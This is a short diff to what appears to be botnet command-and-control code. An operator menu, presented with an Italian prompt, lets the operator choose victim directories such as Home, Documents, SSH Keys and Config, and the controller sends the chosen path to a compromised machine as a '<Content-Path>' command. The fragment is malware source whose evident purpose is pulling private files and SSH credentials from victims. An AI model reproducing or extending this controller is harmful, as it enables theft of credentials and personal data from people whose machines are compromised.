@@ -30,7 +30,7 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
                   "9": b"<Content-Path>",
                   "10": b"<Waiting-For-File>"}
 
-__filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}  # TODO: Probabile convenga modificare la Root con qualcosa di meno intensive
+__filesystem_hierarchy_components = {"1": "Home", "2": "Images", "3": "Documents", "4": "SSH Keys", "5": "Config", "6": "local"}  # TODO: Add others path?
 
 content_dir = []
 
@@ -148,8 +148,8 @@ async def ask_content_path(writer: asyncio.StreamWriter) -> None:
         request = await ainput(">>>> ")
         if request in __filesystem_hierarchy_components.keys():
             print(f"Operazione selezionata: {request}")
-            chosen_operation = __response_options["9"] + __filesystem_hierarchy_components.get(request)
-            writer.write(chosen_operation.encode())
+            path_content_choosen = __response_options["9"] + __filesystem_hierarchy_components.get(request)
+            writer.write(path_content_choosen.encode())
     except Exception as e:
         #  TODO: In caso di eccezione ritornare (?)
         bot_master_utils.info(f"{type(e)}: {e}", 2)
